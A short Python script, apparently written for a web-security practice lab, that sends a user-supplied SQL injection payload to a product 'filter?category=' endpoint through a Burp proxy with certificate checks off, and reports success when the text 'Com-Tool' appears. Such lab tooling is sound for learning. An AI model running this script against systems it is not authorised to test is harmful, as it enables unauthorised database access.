import requests #for making http requests
import sys #sys.argv
import urllib3 #handles http requests
urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)

proxies = {'http' : 'http://127.0.0.1','https' : 'http://127.0.0.1:8080'} #for debugging via burp's Proxies


def exploit_sqli(url,payload):
    uri="filter?category="
    r = requests.get(url+uri+payload,verify=False,proxies=proxies)
    print(r)
    if "Com-Tool" in r.text:
        return True
    else:
        return False



def main():
    try:
        print('Checking for sqli ......')
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print("usage : %s <url> <payload>"% sys.argv[0])
        print('Example:%s www.example.com "1=1"'%sys.argv[0])
        sys.exit(-1)


    if exploit_sqli(url,payload):
        print('[+] Sql injection successful')
    else:
        print("[+] sql injection failed!")



if __name__=='__main__':
    main()






